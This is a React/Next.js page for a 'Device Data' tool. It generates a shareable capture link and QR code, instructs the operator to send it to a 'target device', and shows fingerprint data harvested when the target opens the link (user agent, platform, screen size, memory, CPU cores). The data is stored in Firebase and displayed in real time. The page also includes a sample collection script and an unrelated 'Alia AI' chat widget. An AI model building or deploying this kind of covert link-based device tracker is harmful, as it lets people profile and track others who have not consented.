"use client";

import { useState, useEffect, useRef } from "react";
import { motion } from "framer-motion";
import { Smartphone, QrCode, Link2, Copy, Check, Database, Cpu, HardDrive, Wifi, X, Sparkles, Menu, Send } from "lucide-react";
import { ref, push, onValue, set } from "firebase/database";
import { database } from "@/lib/firebase";
import { useAuth } from "@/contexts/AuthContext";

interface DeviceInfo {
  id: string;
  userAgent: string;
  platform: string;
  language: string;
  screenWidth: number;
  screenHeight: number;
  colorDepth: number;
  timestamp: number;
  ip?: string;
}

export default function DeviceDataPage() {
  const [uniqueLink, setUniqueLink] = useState("");
  const [copied, setCopied] = useState(false);
  const [capturedDevices, setCapturedDevices] = useState<DeviceInfo[]>([]);
  const { user } = useAuth();

  // Chat state
  const [messages, setMessages] = useState<Array<{ text: string; sender: "user" | "bot"; time: string }>>([]);
  const [inputValue, setInputValue] = useState("");
  const [isTyping, setIsTyping] = useState(false);
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [glassIntense, setGlassIntense] = useState(true);
  const chatBoxRef = useRef<HTMLDivElement>(null);
  const textareaRef = useRef<HTMLTextAreaElement>(null);

  const WORKER_URL = "https://alia.aliaaiultra4.workers.dev";

  const getTime = () => {
    return new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', hour12: true });
  };

  const addMessage = (text: string, sender: "user" | "bot") => {
    setMessages(prev => [...prev, { text, sender, time: getTime() }]);
  };

  const sendMessage = async () => {
    const message = inputValue.trim();
    if (!message) return;
    addMessage(message, "user");
    setInputValue("");
    setIsTyping(true);
    try {
      const response = await fetch(WORKER_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ message })
      });
      const data = await response.json();
      const botReply = data.reply || "Hmm, I'm not sure. Please try again!";
      addMessage(botReply, "bot");
    } catch (err) {
      addMessage("Connection error. Please check network.", "bot");
      console.error(err);
    } finally {
      setIsTyping(false);
    }
  };

  const resetChatHistory = () => {
    setMessages([{
      text: "Hello 👋\n\nI'm Alia AI. How can I help you today?",
      sender: "bot",
      time: getTime()
    }]);
  };

  const onProjectClick = (projectName: string) => {
    addMessage(`✨ *Project insight*: ${projectName} is part of Alia ecosystem. More features coming soon.`, "bot");
    setIsModalOpen(false);
  };

  useEffect(() => {
    if (user) {
      const linkId = user.uid.slice(0, 8);
      setUniqueLink(`${window.location.origin}/capture/${linkId}`);

      const devicesRef = ref(database, `device-data/${linkId}`);
      const unsubscribe = onValue(devicesRef, (snapshot) => {
        const data = snapshot.val();
        if (data) {
          const deviceList = Object.entries(data).map(([id, device]) => ({
            id,
            ...(device as Omit<DeviceInfo, 'id'>),
          }));
          setCapturedDevices(deviceList.reverse());
        }
      });

      return () => unsubscribe();
    }
  }, [user]);

  useEffect(() => {
    resetChatHistory();
  }, []);

  useEffect(() => {
    if (chatBoxRef.current) {
      chatBoxRef.current.scrollTop = chatBoxRef.current.scrollHeight;
    }
  }, [messages, isTyping]);

  const copyToClipboard = () => {
    navigator.clipboard.writeText(uniqueLink);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <div className="min-h-screen px-4 pb-32 pt-28">
      <motion.div
        initial={{ opacity: 0, y: 30 }}
        animate={{ opacity: 1, y: 0 }}
        className="text-center"
      >
        <motion.img
          src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/photo_2026-05-12_13-19-21-I7kWhxum6OQv4MpbRdO4rwicOxF9Km.jpg" 
          alt="MIT Network Logo" 
          initial={{ scale: 0.8, opacity: 0 }}
          animate={{ scale: 1, opacity: 1 }}
          transition={{ delay: 0.2 }}
          className="mx-auto mb-4 h-24 w-24 object-contain drop-shadow-[0_0_20px_rgba(16,185,129,0.5)]"
          crossOrigin="anonymous"
        />
        
        <h1 className="text-3xl font-bold text-white">Device Data</h1>
        <p className="mt-2 text-sm text-emerald-400/60">Remote Device Information Capture</p>
      </motion.div>

      <motion.div
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        transition={{ delay: 0.4 }}
        className="mx-auto mt-8 max-w-md rounded-2xl border border-emerald-500/20 bg-emerald-950/30 p-4 backdrop-blur-sm"
      >
        <p className="text-sm text-emerald-400/80">
          Share the link below with the target device. When they open the link, 
          their device information will be captured and displayed here in real-time.
        </p>
      </motion.div>

      <motion.div
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ delay: 0.5 }}
        className="mx-auto mt-6 max-w-md space-y-4"
      >
        <div className="rounded-2xl border border-emerald-500/20 bg-emerald-950/30 p-4 backdrop-blur-sm">
          <div className="mb-3 flex items-center gap-2 text-sm text-emerald-400">
            <Link2 size={16} />
            <span>Capture Link</span>
          </div>
          <div className="flex items-center gap-2">
            <input
              type="text"
              value={uniqueLink}
              readOnly
              className="flex-1 rounded-xl border border-emerald-500/20 bg-black/30 px-3 py-2 text-xs text-emerald-300 outline-none"
            />
            <motion.button
              onClick={copyToClipboard}
              whileHover={{ scale: 1.05 }}
              whileTap={{ scale: 0.95 }}
              className="rounded-xl bg-emerald-600 p-2 text-white"
            >
              {copied ? <Check size={18} /> : <Copy size={18} />}
            </motion.button>
          </div>
        </div>

        <div className="rounded-2xl border border-emerald-500/20 bg-emerald-950/30 p-4 text-center backdrop-blur-sm">
          <QrCode size={100} className="mx-auto text-emerald-400" />
          <p className="mt-2 text-xs text-emerald-500/50">Scan to capture device data</p>
        </div>
      </motion.div>

      <motion.div
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        transition={{ delay: 0.6 }}
        className="mx-auto mt-8 max-w-md"
      >
        <h2 className="mb-4 flex items-center gap-2 text-sm uppercase tracking-widest text-emerald-400/60">
          <Database size={14} />
          Captured Devices ({capturedDevices.length})
        </h2>

        {capturedDevices.length === 0 ? (
          <div className="rounded-2xl border border-dashed border-emerald-500/20 bg-emerald-950/20 p-8 text-center">
            <Wifi className="mx-auto mb-3 h-12 w-12 text-emerald-500/30" />
            <p className="text-sm text-emerald-500/50">Waiting for device connections...</p>
          </div>
        ) : (
          <div className="space-y-3">
            {capturedDevices.map((device, index) => (
              <motion.div
                key={device.id}
                initial={{ opacity: 0, x: -20 }}
                animate={{ opacity: 1, x: 0 }}
                transition={{ delay: index * 0.1 }}
                className="rounded-2xl border border-emerald-500/20 bg-emerald-950/30 p-4 backdrop-blur-sm"
              >
                <div className="mb-3 flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    <div className="h-2 w-2 rounded-full bg-emerald-500" />
                    <span className="text-xs text-emerald-400">Device #{index + 1}</span>
                  </div>
                  <span className="text-xs text-emerald-500/50">
                    {new Date(device.timestamp).toLocaleString()}
                  </span>
                </div>
                
                <div className="grid grid-cols-2 gap-2 text-xs">
                  <div className="flex items-center gap-2 rounded-lg bg-black/20 p-2">
                    <Cpu size={12} className="text-emerald-500" />
                    <span className="text-emerald-300">{device.platform}</span>
                  </div>
                  <div className="flex items-center gap-2 rounded-lg bg-black/20 p-2">
                    <HardDrive size={12} className="text-emerald-500" />
                    <span className="text-emerald-300">{device.screenWidth}x{device.screenHeight}</span>
                  </div>
                </div>
                
                <p className="mt-2 truncate text-xs text-emerald-500/50">
                  {device.userAgent}
                </p>
              </motion.div>
            ))}
          </div>
        )}
      </motion.div>

      {/* Alia AI Chat Section */}
      <motion.div
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ delay: 0.7 }}
        className="mx-auto mt-8 max-w-md"
      >
        <div className="rounded-2xl border border-emerald-500/20 bg-emerald-950/30 backdrop-blur-sm overflow-hidden">
          {/* Chat Header */}
          <div className="flex items-center justify-between p-3 border-b border-emerald-500/20">
            <div className="flex items-center gap-2">
              <div className="h-8 w-8 rounded-full overflow-hidden border border-emerald-500/50">
                <img 
                  src="https://i.postimg.cc/Wz5YXJgC/c6d87db279f921d6f9c5b1be88b84014.jpg" 
                  alt="Alia avatar"
                  className="w-full h-full object-cover"
                />
              </div>
              <div>
                <h3 className="text-sm font-semibold text-white">Alia AI</h3>
                <div className="flex items-center gap-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500 shadow-[0_0_5px_#00ff99]" />
                  <span className="text-[10px] text-emerald-400/70">Online</span>
                </div>
              </div>
            </div>
            <div className="flex gap-1">
              <button 
                onClick={() => setIsModalOpen(true)}
                className="h-7 w-7 rounded-lg bg-white/5 border border-white/10 flex items-center justify-center text-emerald-400 text-sm hover:bg-emerald-500/20 transition"
              >
                ⋮
              </button>
            </div>
          </div>

          {/* Chat Messages */}
          <div 
            ref={chatBoxRef}
            className="h-80 overflow-y-auto p-3 space-y-3 bg-gradient-to-b from-black/40 to-emerald-950/20"
            style={{ scrollBehavior: "smooth" }}
          >
            {messages.map((msg, idx) => (
              <div key={idx} className={`flex gap-2 ${msg.sender === "user" ? "justify-end" : ""}`}>
                {msg.sender === "bot" && (
                  <div className="h-7 w-7 rounded-full overflow-hidden flex-shrink-0 border border-white/10">
                    <img src="https://i.postimg.cc/Wz5YXJgC/c6d87db279f921d6f9c5b1be88b84014.jpg" className="w-full h-full object-cover" alt="bot" />
                  </div>
                )}
                <div className={`max-w-[82%] px-3 py-2 rounded-2xl text-xs leading-relaxed ${
                  msg.sender === "user" 
                    ? "bg-gradient-to-r from-emerald-700/60 to-emerald-600/40 text-white border border-emerald-500/20" 
                    : "bg-black/40 text-emerald-100 border border-white/10"
                }`}>
                  <div className="whitespace-pre-wrap">{msg.text}</div>
                  <div className="text-[9px] opacity-50 mt-1">{msg.time}</div>
                </div>
              </div>
            ))}
            {isTyping && (
              <div className="flex gap-2">
                <div className="h-7 w-7 rounded-full overflow-hidden flex-shrink-0 border border-white/10">
                  <img src="https://i.postimg.cc/Wz5YXJgC/c6d87db279f921d6f9c5b1be88b84014.jpg" className="w-full h-full object-cover" alt="bot" />
                </div>
                <div className="bg-black/40 text-emerald-100 border border-white/10 rounded-2xl px-4 py-2">
                  <div className="flex gap-1">
                    <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-bounce" style={{ animationDelay: "0s" }} />
                    <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-bounce" style={{ animationDelay: "0.2s" }} />
                    <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-bounce" style={{ animationDelay: "0.4s" }} />
                  </div>
                </div>
              </div>
            )}
          </div>

          {/* Chat Input */}
          <div className="p-2 border-t border-emerald-500/20 bg-black/30">
            <div className="flex items-center gap-2">
              <button 
                onClick={() => setInputValue("✨ Suggest something creative ✨")}
                className="h-9 w-9 rounded-full bg-gradient-to-r from-emerald-600/50 to-emerald-500/30 text-white flex items-center justify-center text-sm hover:scale-105 transition"
              >
                ✦
              </button>
              <div className="flex-1 relative">
                <textarea
                  ref={textareaRef}
                  value={inputValue}
                  onChange={(e) => setInputValue(e.target.value)}
                  onKeyDown={(e) => {
                    if (e.key === "Enter" && !e.shiftKey) {
                      e.preventDefault();
                      sendMessage();
                    }
                  }}
                  placeholder="Message Alia AI..."
                  className="w-full resize-none rounded-full bg-black/50 text-white text-sm py-2 px-4 pr-8 outline-none border border-emerald-500/30 focus:border-emerald-400 transition"
                  rows={1}
                  style={{ height: "auto", minHeight: "36px" }}
                />
                <span className="absolute right-3 top-1/2 -translate-y-1/2 text-sm opacity-50">☺</span>
              </div>
              <button 
                onClick={sendMessage}
                className="h-9 w-9 rounded-full bg-gradient-to-r from-emerald-600 to-emerald-500 text-white flex items-center justify-center hover:scale-105 transition"
              >
                <Send size={14} />
              </button>
            </div>
          </div>
        </div>
      </motion.div>

      {/* Modal */}
      {isModalOpen && (
        <div 
          className="fixed inset-0 bg-black/70 backdrop-blur-md flex items-center justify-center z-50 p-4"
          onClick={() => setIsModalOpen(false)}
        >
          <div 
            className="w-full max-w-sm max-h-[70vh] overflow-y-auto rounded-2xl bg-gradient-to-b from-emerald-950/95 to-black/90 border border-emerald-500/30 shadow-2xl"
            onClick={(e) => e.stopPropagation()}
          >
            <div className="flex justify-between items-center p-4 border-b border-emerald-500/20">
              <h3 className="text-lg font-bold bg-gradient-to-r from-white to-emerald-300 bg-clip-text text-transparent">✦ Alia Hub ✦</h3>
              <button onClick={() => setIsModalOpen(false)} className="h-7 w-7 rounded-full bg-white/10 flex items-center justify-center">
                <X size={14} />
              </button>
            </div>
            <div className="p-4 space-y-4">
              <div>
                <h4 className="text-sm font-medium text-emerald-300 mb-2 border-l-2 border-emerald-500 pl-2">⚡ AI Projects</h4>
                <div className="space-y-2">
                  {["NeoVision Studio", "CodeMind X", "EchoFlow Voice", "AetherForge"].map((project) => (
                    <div 
                      key={project}
                      onClick={() => onProjectClick(project)}
                      className="flex justify-between items-center bg-black/30 rounded-xl px-3 py-2 border border-emerald-500/20 cursor-pointer hover:bg-emerald-500/10 transition"
                    >
                      <span className="text-sm">🔮 {project}</span>
                      <span className="text-[10px] bg-emerald-500/20 px-2 py-0.5 rounded-full text-emerald-300">
                        {project.includes("Vision") ? "AI image" : project.includes("Code") ? "Gen dev" : project.includes("Voice") ? "voice AI" : "creative suite"}
                      </span>
                    </div>
                  ))}
                </div>
              </div>
              <div>
                <h4 className="text-sm font-medium text-emerald-300 mb-2 border-l-2 border-emerald-500 pl-2">🎨 Interface</h4>
                <div className="bg-black/30 rounded-xl p-3 flex justify-between items-center">
                  <span className="text-xs">Liquid glass mode</span>
                  <button 
                    onClick={() => setGlassIntense(!glassIntense)}
                    className={`text-xs px-3 py-1 rounded-full ${glassIntense ? "bg-emerald-500/30 text-emerald-300" : "bg-white/10 text-white/70"}`}
                  >
                    {glassIntense ? "✨ active" : "🌙 soft"}
                  </button>
                </div>
                <div className="bg-black/30 rounded-xl p-3 flex justify-between items-center mt-2">
                  <span className="text-xs">Reset conversation</span>
                  <button 
                    onClick={() => { resetChatHistory(); setIsModalOpen(false); }}
                    className="text-xs px-3 py-1 rounded-full bg-red-500/20 text-red-300"
                  >
                    ⟳ clear history
                  </button>
                </div>
              </div>
              <div>
                <h4 className="text-sm font-medium text-emerald-300 mb-2 border-l-2 border-emerald-500 pl-2">📡 About Alia</h4>
                <div className="bg-black/30 rounded-xl p-3 text-center">
                  <span className="text-[11px] text-emerald-400/70">✨ v3.2 • edge intelligence</span>
                </div>
              </div>
            </div>
          </div>
        </div>
      )}

      <motion.div
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        transition={{ delay: 0.8 }}
        className="mx-auto mt-8 max-w-md rounded-xl border border-emerald-500/10 bg-emerald-950/20 p-4"
      >
        <h3 className="mb-3 text-sm font-medium text-emerald-400">Sample Code</h3>
        <pre className="overflow-x-auto rounded-lg bg-black/40 p-3 text-xs text-emerald-300">
{`// Device data capture script
const deviceInfo = {
  userAgent: navigator.userAgent,
  platform: navigator.platform,
  language: navigator.language,
  screen: {
    width: screen.width,
    height: screen.height,
    colorDepth: screen.colorDepth
  },
  memory: navigator.deviceMemory,
  cores: navigator.hardwareConcurrency
};

// Send to Firebase
firebase.database()
  .ref('device-data')
  .push(deviceInfo);`}
        </pre>
      </motion.div>
    </div>
  );
}
